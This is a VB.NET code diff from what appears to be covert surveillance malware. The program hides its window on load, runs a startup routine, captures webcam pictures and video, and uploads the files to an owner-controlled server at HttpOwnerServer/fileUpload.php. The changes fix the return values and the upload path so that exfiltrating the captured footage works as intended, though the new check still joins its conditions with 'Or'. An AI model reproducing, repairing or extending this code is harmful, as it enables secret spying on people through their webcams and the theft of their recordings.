@@ -66,8 +66,8 @@ Public Class Main
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Hide()
         parameters = Command()
-        ReadParameters(parameters)
         StartUp.Init()
+        ReadParameters(parameters)
         AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
     End Sub
 
@@ -84,7 +84,7 @@ Public Class Main
             Return filePath
         Catch ex As Exception
             AddToLog("TakeCamPicture@Main", "Error: " & ex.Message, True)
-            Return 1
+            Return "null"
         End Try
     End Function
 
@@ -98,11 +98,11 @@ Public Class Main
             Return 0
         Catch ex As Exception
             AddToLog("StartCamRecord@Main", "Error: " & ex.Message, True)
-            Return 1
+            Return "null"
         End Try
     End Function
 
-    Function StopCamRecord()
+    Function StopCamRecord() As String
         Try
             Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
             If isWebCamRecording Then
@@ -118,15 +118,14 @@ Public Class Main
             Return filePath
         Catch ex As Exception
             AddToLog("StopCamRecord@Main", "Error: " & ex.Message, True)
-            Return 1
+            Return "null"
         End Try
     End Function
 
     Sub UploadFileToServer(ByVal filePath As String)
         Try
-            If filePath <> 1 Or filePath.ToLower <> "null" Or filePath <> Nothing Then
-                Dim fileName As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Scrincam.avi"
-                My.Computer.Network.UploadFile(fileName, HttpOwnerServer & "/fileUpload.php")
+            If filePath.ToLower <> "null" Or filePath <> Nothing Then
+                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
                 End
             End If
         Catch ex As Exception
